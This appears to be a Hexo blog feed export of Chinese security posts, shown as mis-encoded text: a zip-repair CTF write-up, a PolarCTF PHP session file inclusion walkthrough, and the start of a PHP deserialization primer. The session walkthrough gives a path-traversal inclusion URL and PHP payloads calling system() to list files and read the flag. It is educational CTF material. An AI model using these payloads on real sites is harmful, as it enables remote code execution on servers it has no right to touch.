alt="PixPin_2025-04-24_20-59-20"></p><p>ä¿å­˜ä»¥å</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts">hexo g &amp;<span class="hljs-variable">&amp;hexo</span> d&amp;<span class="hljs-variable">&amp;hexo</span> cl<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>åšå®¢æ­å»º</category>
      
    </categories>
    
    
    <tags>
      
      <tag>åšå®¢æ­å»º</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TGCTF ez_zip</title>
    <link href="/2025/04/24/TGCTF-ez-zip/"/>
    <url>/2025/04/24/TGCTF-ez-zip/</url>
    
    <content type="html"><![CDATA[<h1 id="TGCTF-ez-zip"><a href="#TGCTF-ez-zip" class="headerlink" title="TGCTF ez_zip"></a>TGCTF ez_zip</h1><p>å‰é¢å°±æ˜¯æ­£å¸¸çˆ†ç ´ï¼Œå·²çŸ¥æ˜æ–‡æ”»å‡»</p><p>ç»“æŸåå‘ç°æ–‡ä»¶æ‰“ä¸å¼€ æ˜¾ç¤ºæ–‡ä»¶å·²æŸå</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-22_21-25-37.png" alt="PixPin_2025-04-22_21-25-37"></p><p>ä¿®å¤å‹ç¼©åŒ…å¾—åˆ°flag</p><p>æ–¹æ³•ä¸€ï¼š</p><p>é¢˜ç›®æ˜¯ä¿®æ”¹äº†æ–‡ä»¶åé•¿åº¦å’Œå‹ç¼©æ–¹å¼</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-22_21-51-07.png" alt="PixPin_2025-04-22_21-51-07"></p><p>flag.txté•¿åº¦åº”ä¸º8,æ”¹å›08 00</p><p>å‹ç¼©æ–¹å¼ä»COMP_DEFLATEæ”¹æˆäº†COMP_STORED,ä½†å¾ˆæ˜æ˜¾æ–‡ä»¶æ˜¯å‹ç¼©è¿‡çš„,æŠŠè¿™<br>ä¸¤ä¸ªåœ°æ–¹ä¿®æ”¹</p><p>å„ç§å‹ç¼©æ–¹å¼</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-23_17-18-03.png" alt="PixPin_2025-04-23_17-18-03"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-23_17-18-25.png" alt="PixPin_2025-04-23_17-18-25"></p><p>ç¬¬äºŒç§æ–¹æ³•</p><p><strong>å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒº</strong>å’Œ<strong>å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº</strong>åœ¨<strong>æ–‡ä»¶å¤´æ ‡è®°å</strong>,é™¤äº†å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº<br>å¤šå‡ºä¸€æ¡å‹ç¼©ä½¿ç”¨çš„ç‰ˆæœ¬ (2 bytes) ,å³æœ¬é¢˜ä¸­é‡å¤å‡ºç°çš„ä¸¤æ¬¡14 00,<strong>ä¸€ç›´åˆ°æ–‡ä»¶åé•¿åº¦</strong><br>**08 00,éƒ½æ˜¯ä¿æŒä¸€è‡´çš„,**æ‰€ä»¥å¯ä»¥ç›´æ¥å°†å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºçš„åå…­è¿›åˆ¶æ•°æ®å¤åˆ¶å¡«å…¥å‹ç¼©æº<br>æ–‡ä»¶ç›®å½•åŒºè¡¨ç¤ºæ–‡ä»¶åé•¿åº¦çš„08 00å‰å³å¯</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-23_17-50-21.png" alt="PixPin_2025-04-23_17-50-21"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-23_17-52-29.png" alt="PixPin_2025-04-23_17-52-29"></p><p>ç¬¬ä¸‰ç§æ–¹æ³•</p><p>å› ä¸ºæ²¡æœ‰åŠ å¯†å‹ç¼©åŒ…,æ‰€ä»¥frDataå­—æ®µå°±æ˜¯zlibå‹ç¼©çš„å†…å®¹ï¼Œç›´æ¥å°†è¿™éƒ¨åˆ†æ‹¿å‡ºæ¥ï¼ŒåŠ ä¸Šzlibå¤´ (789C)ï¼Œzlibè§£å‹ä¹Ÿå¯ä»¥å¾—åˆ°flag</p><p> ä¸ºä»€ä¹ˆæ˜¯è¿™æ ·ï¼Ÿ</p><p>ğŸ“¦ ZIP ä¸­ä½¿ç”¨çš„å‹ç¼©ç®—æ³•</p><p>ZIP æ–‡ä»¶æœ€å¸¸ç”¨çš„å‹ç¼©æ–¹æ³•ç¼–å·ä¸ºï¼š</p><ul><li><code>0</code> â†’ Storeï¼ˆæ— å‹ç¼©ï¼‰</li><li><code>8</code> â†’ Deflateï¼ˆzlib åŒæ¬¾å‹ç¼©æ–¹å¼ï¼‰</li></ul><p>å½“ä½¿ç”¨ Deflate å‹ç¼©æ—¶ï¼ŒZIP æ–‡ä»¶ä¸­çš„å‹ç¼©æ•°æ®å…¶å®å°±æ˜¯ <strong>raw deflate æµ</strong>ï¼Œ<strong>æ²¡æœ‰ zlib å¤´</strong>ï¼Œå› ä¸º ZIP åè®®è‡ªå·±ç®¡ç†äº†å¤´éƒ¨å’Œæ ¡éªŒä¿¡æ¯ã€‚</p><p>é‚£ zlib æ˜¯ä»€ä¹ˆï¼Ÿ</p><p><code>zlib</code> æ˜¯ Deflate ç®—æ³•çš„å°è£…ã€‚</p><ul><li>åœ¨ <code>zlib</code> æ ¼å¼ä¸­ï¼Œå‰ä¸¤å­—èŠ‚ï¼ˆé€šå¸¸æ˜¯ <code>0x78 9C</code>ï¼‰æ˜¯å¤´ä¿¡æ¯ï¼Œè¯´æ˜å‹ç¼©æ–¹å¼ã€çª—å£å¤§å°ã€æ ¡éªŒæ–¹æ³•ç­‰ã€‚</li><li>ä½†æ˜¯ ZIP æ ¼å¼çš„æ–‡ä»¶æ•°æ®ä¸åŒ…å«è¿™ä¸ªå¤´ï¼Œå®ƒåªä¿å­˜ <strong>çº¯ deflate æ•°æ®</strong>ã€‚</li></ul><p>ğŸ”§ æ‰€ä»¥è¦è‡ªå·±åŠ ä¸Š zlib å¤´ï¼</p><p>æ˜¯çš„ï¼Œå¦‚æœä½ æŠŠ ZIP æ–‡ä»¶é‡Œ <code>Local File Header</code> åé¢çš„æ•°æ®å•ç‹¬æ‹¿å‡ºæ¥ï¼ˆå‹ç¼©æ•°æ®éƒ¨åˆ†ï¼‰ï¼Œå®ƒå°±æ˜¯è£¸ deflateã€‚</p><p>ä½ åªè¦ï¼š</p><ol><li><strong>åŠ ä¸Š zlib headerï¼ˆæ¯”å¦‚ <code>0x78 9C</code>ï¼‰</strong></li><li>ç„¶åç”¨ <code>zlib.decompress()</code> æ¥è§£å‹</li></ol><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-23_18-08-42.png" alt="PixPin_2025-04-23_18-08-42"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-23_18-09-05.png" alt="PixPin_2025-04-23_18-09-05"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">78</span> <span class="hljs-number">9</span>C <span class="hljs-number">0</span>B <span class="hljs-number">71</span> <span class="hljs-number">77</span> <span class="hljs-number">0</span>E <span class="hljs-number">71</span> AB <span class="hljs-number">0</span>E <span class="hljs-number">4</span>F <span class="hljs-number">2</span>C <span class="hljs-number">2</span>A CA CC <span class="hljs-number">2</span>F <span class="hljs-number">8</span>A<br><span class="hljs-attribute">8F</span> CC <span class="hljs-number">2</span>F <span class="hljs-number">8</span>D CF <span class="hljs-number">48</span> <span class="hljs-number">2</span>C <span class="hljs-number">4</span>B <span class="hljs-number">8</span>D <span class="hljs-number">4</span>F <span class="hljs-number">49</span> <span class="hljs-number">4</span>D <span class="hljs-number">4</span>B <span class="hljs-number">4</span>D <span class="hljs-number">2</span>C <span class="hljs-number">49</span><br><span class="hljs-attribute">4D</span> <span class="hljs-number">89</span> <span class="hljs-number">2</span>F C9 <span class="hljs-number">48</span> <span class="hljs-number">8</span>D <span class="hljs-number">4</span>F CF <span class="hljs-number">4</span>C CC <span class="hljs-number">2</span>B <span class="hljs-number">89</span> <span class="hljs-number">4</span>F <span class="hljs-number">29</span> <span class="hljs-number">4</span>A <span class="hljs-number">4</span>C<br><span class="hljs-attribute">CF</span> CF <span class="hljs-number">53</span> AC <span class="hljs-number">05</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>å®æ“</category>
      
      <category>Misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å‹ç¼©åŒ…ä¿®å¤</tag>
      
      <tag>TGCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>polarctf sessionæ–‡ä»¶åŒ…å«</title>
    <link href="/2025/04/21/polarctf-session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2025/04/21/polarctf-session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="polarctf-sessionæ–‡ä»¶åŒ…å«"><a href="#polarctf-sessionæ–‡ä»¶åŒ…å«" class="headerlink" title="polarctf sessionæ–‡ä»¶åŒ…å«"></a>polarctf sessionæ–‡ä»¶åŒ…å«</h1><h2 id="Sessionæ–‡ä»¶åŒ…å«æ¼æ´"><a href="#Sessionæ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="Sessionæ–‡ä»¶åŒ…å«æ¼æ´"></a>Sessionæ–‡ä»¶åŒ…å«æ¼æ´</h2><p>å½“å¯ä»¥è·å–sessionæ–‡ä»¶è·¯å¾„å¹¶ä¸”sessionæ–‡ä»¶çš„å†…å®¹å¯æ§çš„çš„æ—¶å€™ï¼Œå°±å¯ä»¥é€šè¿‡åŒ…å«sessionæ–‡ä»¶è¿›è¡Œæ”»å‡»</p><h3 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><p>sessionæ–‡ä»¶åŒ…å«çš„åˆ©ç”¨æ¡ä»¶æœ‰ä¸¤ä¸ªï¼š</p><ul><li>Sessionçš„å­˜å‚¨ä½ç½®å¯ä»¥è·å–</li><li>Sessionçš„å†…å®¹å¯æ§</li></ul><p>ä¸€èˆ¬é€šè¿‡ä»¥ä¸‹ä¸¤ç§æ–¹å¼è·å–sessionçš„å­˜å‚¨ä½ç½®ï¼š</p><ul><li><p>é€šè¿‡phpinfoçš„ä¿¡æ¯è·å–sessionçš„å­˜å‚¨ä½ç½®ã€‚<br>é€šè¿‡phpinfoçš„ä¿¡æ¯è·å–<code>session.save_path</code></p></li><li><p>é€šè¿‡çŒœæµ‹é»˜è®¤çš„sessionå­˜å‚¨ä½ç½®è¿›è¡Œå°è¯•<br>é€šå¸¸Linuxä¸­çš„Sessionçš„é»˜è®¤å­˜å‚¨ä½ç½®åœ¨<code>/var/lib/php/session</code>ç›®å½•ä¸‹</p></li><li><pre><code class="hljs">temp/session<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br>  <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## ç¤ºä¾‹åˆ†æ</span></span><br><br>sessionæ–‡ä»¶åŒ…å«ä»£ç å¦‚ä¸‹<br><br>```php<br>session_start();<br><span class="hljs-meta prompt_">$</span><span class="language-bash">ctfs=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctfs&#x27;</span>];</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">_SESSION[<span class="hljs-string">&#x27;username&#x27;</span>]=<span class="hljs-variable">$ctfs</span></span><br></code></pre></td></tr></table></figure></code></pre></li></ul><p>æ­¤ä»£ç å¯ä»¥é€šè¿‡GETå‹çš„ctfså‚æ•°ä¼ å…¥ã€‚PHPä»£ç å°†ä¼šè·å–çš„å€¼å­˜å…¥åˆ°Sessionä¸­ã€‚<br>æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ctfså‚æ•°å°†æ¶æ„ä»£ç å†™å…¥åˆ°sessionæ–‡ä»¶ä¸­ï¼Œç„¶ååœ¨åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´åŒ…å«æ­¤sessionæ–‡ä»¶ï¼Œå‘ç³»ç»Ÿä¸­ä¼ é€’æ¶æ„ä»£ç ã€‚</p><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>ä¸Šé¢çš„ä»£ç æ»¡è¶³Sessionæ–‡ä»¶åŒ…å«çš„ä¸¤ä¸ªè¦æ±‚</p><ul><li>PHPä»£ç å°†ä¼šè·å–ctfså˜é‡çš„å€¼å­˜å…¥åˆ°sessionä¸­</li><li>Sessionçš„é»˜è®¤ å­˜å‚¨ä½ç½®æ˜¯&#x2F;var&#x2F;lib&#x2F;php&#x2F;session</li></ul><p>è®¿é—®URLï¼š<code>http://www.abc.com/xxx/session.php?ctfs=a</code> ä¼šåœ¨&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessionç›®å½•ä¸‹é™ctfsä¼ å…¥çš„å€¼å­˜å‚¨åˆ°sessionä¸­<br>Sessionçš„æ–‡ä»¶åä»¥sess_å¼€å¤´ï¼Œåè·ŸSessionidï¼ŒSessionidå¯ä»¥é€šè¿‡å¼€å‘è€…æ¨¡å¼è·å–ï¼š<br>å•å‡»å³é”®â€”â€”æ£€æŸ¥â€”â€”å­˜å‚¨â€”â€”Cookieâ€”â€”PHPSESSID å°±å¯ä»¥æ‰¾åˆ°å†…å®¹</p><p>å‡è®¾é€šè¿‡å¼€å‘è€…æ¨¡å¼è·å–åˆ°çš„sessionidçš„å€¼ä¸ºhufh7hsdf392eurh4,æ‰€ä»¥sessionçš„æ–‡ä»¶åä¸º<code>sess_hufh7hsdf392eurh4</code></p><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>é€šè¿‡ä¸Šé¢çš„åˆ†æï¼Œå¯ä»¥å¾—çŸ¥ï¼Œå‘ctfså‚æ•°ä¼ å…¥çš„å†…å®¹ä¼šå­˜å‚¨åˆ°sessionæ–‡ä»¶ä¸­ã€‚<br>å¦‚æœå­˜åœ¨æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå°±å¯ä»¥é€šè¿‡ctfså†™å…¥æ¶æ„ä»£ç åˆ°Sessionæ–‡ä»¶å½“ä¸­å»ï¼Œç„¶åé€šè¿‡æ–‡ä»¶åŒ…å«æ¼æ´æ‰§è¡Œgetshell</p><p>ä¾‹å¦‚ï¼šè®¿é—®ä»£ç <code>http://www.abc.com/xxx/session.php?ctfs=&lt;?php phpinfo();?&gt;</code>åï¼Œä¼šåœ¨&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessionç›®å½•ä¸‹é™ctfsçš„å€¼å†™å…¥sessionæ–‡ä»¶<br>sessionæ–‡ä»¶çš„å†…å®¹ä¸ºï¼š<code>username|s:18:&quot;&lt;?php phpinfo();?&gt;&quot;</code>.</p><p><strong>æ”»å‡»æ­¥éª¤</strong></p><ul><li>å°†æ¶æ„ä»£ç å†™å…¥sessionæ–‡ä»¶</li><li>æ”»å‡»è€…å¯ä»¥é€šè¿‡PHPinfoæˆ–è€…çŒœæµ‹åˆ°sessionå­˜æ”¾çš„ä½ç½®</li><li>é€šè¿‡å¼€å‘è€…æ¨¡å¼å¯ä»¥è·å¾—æ–‡ä»¶åç§°</li><li>é€šè¿‡æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´å¯ä»¥è§£æsessionæ–‡ä»¶è¾¾åˆ°æ”»å‡»çš„ç›®çš„</li></ul><p>æ¯”å¦‚ï¼š<code>http://www.abc.com/xxx/file.php?file=../../var/lib/php/session/sess_7sdfysdfywy9323cew2</code></p><p><a href="https://www.cnblogs.com/Zeker62/p/15322771.html#session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E">âœ”PHPæ–‡ä»¶åŒ…å«æ¼æ´å…¨é¢æ€»ç»“ - Zeker62 - åšå®¢å›­</a></p><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-21_19-13-32.png" alt="PixPin_2025-04-21_19-13-32"></p><p>åˆ©ç”¨phpä¼ªåè®®è¯»å–action.php</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-21_19-13-13.png" alt="PixPin_2025-04-21_19-13-13"></p><p>base64è§£ç å¾—åˆ°æºç ï¼Œè·Ÿsessionæ–‡ä»¶åŒ…å«å®ä¾‹å‡ ä¹ä¸€æ ·</p><p>PHPä»£ç å°†ä¼šè·å–POSTå‹nameå˜é‡çš„å€¼å­˜å…¥åˆ°sessionä¸­</p><p>åˆ©ç”¨å¼€å‘è€…æ¨¡å¼æ‰¾åˆ°äº†sessionçš„å€¼ msd07aqckf2mag1um8qtjapj50</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-21_19-35-39.png" alt="PixPin_2025-04-21_19-35-39"></p><p>è®¿é—®ä»£ç <code>http://www.abc.com/temp/sess_xxxxx?</code>åï¼Œä¼šåœ¨&#x2F;sessionç›®å½•ä¸‹å°†nameçš„å€¼å†™å…¥sessionæ–‡ä»¶ ,å‘ç³»ç»Ÿä¸­ä¼ é€’æ¶æ„ä»£ç ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-21_19-50-28.png" alt="PixPin_2025-04-21_19-50-28"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">name=<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<span class="hljs-meta">?&gt;</span><br>name=<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;tac flaggggg&#x27;</span>)<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-21_19-59-03.png" alt="PixPin_2025-04-21_19-59-03"></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
      <category>åŸºç¡€çŸ¥è¯†</category>
      
      <category>å®æ“</category>
      
    </categories>
    
    
    <tags>
      
      <tag>polarctf</tag>
      
      <tag>sessionæ–‡ä»¶åŒ…å«</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phpååºåˆ—åŒ–åŸºç¡€</title>
    <link href="/2025/04/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/"/>
    <url>/2025/04/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="phpååºåˆ—åŒ–åŸºç¡€"><a href="#phpååºåˆ—åŒ–åŸºç¡€" class="headerlink" title="phpååºåˆ—åŒ–åŸºç¡€"></a>phpååºåˆ—åŒ–åŸºç¡€</h1><h2 id="ä»€ä¹ˆæ˜¯åºåˆ—åŒ–ï¼Œååºåˆ—åŒ–"><a href="#ä»€ä¹ˆæ˜¯åºåˆ—åŒ–ï¼Œååºåˆ—åŒ–" class="headerlink" title="ä»€ä¹ˆæ˜¯åºåˆ—åŒ–ï¼Œååºåˆ—åŒ–"></a>ä»€ä¹ˆæ˜¯åºåˆ—åŒ–ï¼Œååºåˆ—åŒ–</h2><p><strong>ååºåˆ—åŒ–ï¼ˆDeserializationï¼‰</strong> æ˜¯æŒ‡å°†<strong>åºåˆ—åŒ–åçš„æ•°æ®</strong>ï¼ˆé€šå¸¸æ˜¯å­—ç¬¦ä¸²æˆ–äºŒè¿›åˆ¶æ ¼å¼ï¼‰<strong>æ¢å¤ä¸ºåŸå§‹æ•°æ®ç»“æ„</strong>ï¼ˆå¦‚æ•°ç»„ã€å¯¹è±¡ï¼‰ã€‚åœ¨ PHP ä¸­ï¼Œ<code>unserialize()</code> å°±æ˜¯ç”¨æ¥æ‰§è¡Œååºåˆ—åŒ–çš„ï¼Œå®ƒå¯ä»¥æŠŠ <code>serialize()</code> å¤„ç†è¿‡çš„å­—ç¬¦ä¸²è¿˜åŸæˆåŸå§‹çš„ PHP å˜é‡æˆ–å¯¹è±¡ã€‚</p><p><strong>ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// åºåˆ—åŒ–å¯¹è±¡</span><br><span class="hljs-variable">$data</span> = [<span class="hljs-string">&#x27;name&#x27;</span> =&gt; <span class="hljs-string">&#x27;Alice&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span> =&gt; <span class="hljs-number">25</span>];<br><span class="hljs-variable">$serialized</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$data</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;åºåˆ—åŒ–åçš„æ•°æ®: &quot;</span> . <span class="hljs-variable">$serialized</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-comment">// ååºåˆ—åŒ–</span><br><span class="hljs-variable">$unserialized</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$serialized</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$unserialized</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>è¾“å‡º</strong>ï¼š </p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livescript">åºåˆ—åŒ–åçš„æ•°æ®: a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Alice&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">25</span>;&#125;<br><span class="hljs-built_in">Array</span><br>(<br>    [name] =&gt; Alice<br>    [age] =&gt; <span class="hljs-number">25</span><br>)<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªè¿‡ç¨‹å°±æ˜¯ï¼š</p><ul><li><strong>åºåˆ—åŒ–</strong>ï¼šæŠŠæ•°ç»„è½¬æ¢æˆå­—ç¬¦ä¸²ï¼ˆä¾¿äºå­˜å‚¨ã€ä¼ è¾“ï¼‰ã€‚</li><li><strong>ååºåˆ—åŒ–</strong>ï¼šæŠŠå­—ç¬¦ä¸²æ¢å¤æˆæ•°ç»„ï¼ˆä¾¿äºç¨‹åºä½¿ç”¨ï¼‰ã€‚</li></ul><p>ç¨‹åºè¯­è¨€ä¹‹æ‰€ä»¥éœ€è¦<strong>åºåˆ—åŒ–ï¼ˆSerializationï¼‰å’Œååºåˆ—åŒ–ï¼ˆDeserializationï¼‰</strong>ï¼Œä¸»è¦æ˜¯ä¸ºäº†æ•°æ®çš„å­˜å‚¨ã€ä¼ è¾“å’Œå…±äº«ã€‚å…·ä½“æ¥è¯´ï¼š</p><p>åœ¨åº”ç”¨å¼€å‘ä¸­ï¼Œæ•°æ®å¾€å¾€éœ€è¦æŒä¹…åŒ–ï¼ˆå¦‚å­˜å…¥æ•°æ®åº“ã€ç¼“å­˜æˆ–æ–‡ä»¶ï¼‰ã€‚ä½†æ•°æ®åº“å’Œæ–‡ä»¶é€šå¸¸å­˜å‚¨çš„æ˜¯å­—ç¬¦ä¸²æˆ–äºŒè¿›åˆ¶æ ¼å¼ï¼Œ<strong>åºåˆ—åŒ–</strong>å¯ä»¥å°†å¤æ‚çš„æ•°æ®ç»“æ„ï¼ˆå¦‚å¯¹è±¡ã€æ•°ç»„ï¼‰è½¬æ¢ä¸ºå¯å­˜å‚¨çš„æ ¼å¼ï¼Œä¹‹åç”¨<strong>ååºåˆ—åŒ–</strong>æ¢å¤å‡ºæ¥ã€‚</p><p><strong>åºåˆ—åŒ– &#x3D; æŠŠæ•°æ®è½¬æ¢æˆå­—ç¬¦ä¸²&#x2F;äºŒè¿›åˆ¶ï¼ˆæ–¹ä¾¿å­˜å‚¨å’Œä¼ è¾“ï¼‰</strong></p><p><strong>ååºåˆ—åŒ– &#x3D; æŠŠå­—ç¬¦ä¸²&#x2F;äºŒè¿›åˆ¶æ¢å¤æˆæ•°æ®ï¼ˆæ–¹ä¾¿ç¨‹åºä½¿ç”¨ï¼‰</strong></p><h2 id="PHP-åºåˆ—åŒ–çš„ä»£å·ä¸é‡Šä¹‰"><a href="#PHP-åºåˆ—åŒ–çš„ä»£å·ä¸é‡Šä¹‰" class="headerlink" title="PHP åºåˆ—åŒ–çš„ä»£å·ä¸é‡Šä¹‰"></a>PHP åºåˆ—åŒ–çš„ä»£å·ä¸é‡Šä¹‰</h2><table><thead><tr><th>ä»£å·</th><th>æ•°æ®ç±»å‹</th><th>é‡Šä¹‰</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td><code>N</code></td><td><code>NULL</code></td><td>è¡¨ç¤º <code>NULL</code> å€¼</td><td><code>N;</code></td></tr><tr><td><code>b</code></td><td><code>boolean</code></td><td>å¸ƒå°”å€¼ <code>true</code> æˆ– <code>false</code></td><td><code>b:1;</code>ï¼ˆtrueï¼‰ï¼Œ<code>b:0;</code>ï¼ˆfalseï¼‰</td></tr><tr><td><code>i</code></td><td><code>integer</code></td><td>æ•´æ•°</td><td><code>i:123;</code></td></tr><tr><td><code>d</code></td><td><code>double</code>ï¼ˆæµ®ç‚¹æ•°ï¼‰</td><td>æµ®ç‚¹æ•°</td><td><code>d:3.14;</code></td></tr><tr><td><code>s</code></td><td><code>string</code></td><td>å­—ç¬¦ä¸²ï¼ˆåŒ…å«é•¿åº¦ï¼‰</td><td><code>s:5:&quot;Alice&quot;;</code></td></tr><tr><td><code>a</code></td><td><code>array</code></td><td>æ•°ç»„ï¼ˆé”®å€¼å¯¹å­˜å‚¨ï¼‰</td><td><code>a:2:&#123;s:4:&quot;name&quot;;s:5:&quot;Alice&quot;;s:3:&quot;age&quot;;i:25;&#125;</code></td></tr><tr><td><code>O</code></td><td><code>object</code></td><td>å¯¹è±¡ï¼ˆåŒ…å«ç±»åå’Œå±æ€§ï¼‰</td><td><code>O:4:&quot;User&quot;:1:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;&#125;</code></td></tr><tr><td><code>R</code></td><td><code>reference</code>ï¼ˆå¼•ç”¨ï¼‰</td><td>å¼•ç”¨ï¼ˆæŒ‡å‘ä¹‹å‰çš„å˜é‡ï¼‰</td><td><code>R:1;</code></td></tr><tr><td><code>C</code></td><td><code>custom object</code></td><td>å¯¹è±¡è‡ªå®šä¹‰åºåˆ—åŒ–ï¼ˆ<code>Serializable</code> æ¥å£ï¼‰</td><td><code>C:8:&quot;MyClass&quot;:9:&#123;datahere&#125;</code></td></tr></tbody></table><p><strong>åœ¨Private æƒé™ç§æœ‰å±æ€§åºåˆ—åŒ–çš„æ—¶å€™æ ¼å¼æ˜¯ %00ç±»å%00å±æ€§å</strong></p><p> <em><em>åœ¨Protected æƒé™åºåˆ—åŒ–çš„æ—¶å€™æ ¼å¼æ˜¯ %00</em>%00å±æ€§å</em>*</p><p><strong>å¯¹è±¡çš„æ–¹æ³•ä¸ä¼šè¢«åºåˆ—åŒ–</strong></p><h4 id="åºåˆ—åŒ–å¯¹è±¡ä¾‹å­ï¼ˆObjectï¼‰"><a href="#åºåˆ—åŒ–å¯¹è±¡ä¾‹å­ï¼ˆObjectï¼‰" class="headerlink" title="åºåˆ—åŒ–å¯¹è±¡ä¾‹å­ï¼ˆObjectï¼‰"></a>åºåˆ—åŒ–å¯¹è±¡ä¾‹å­ï¼ˆObjectï¼‰</h4><p>1. </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code 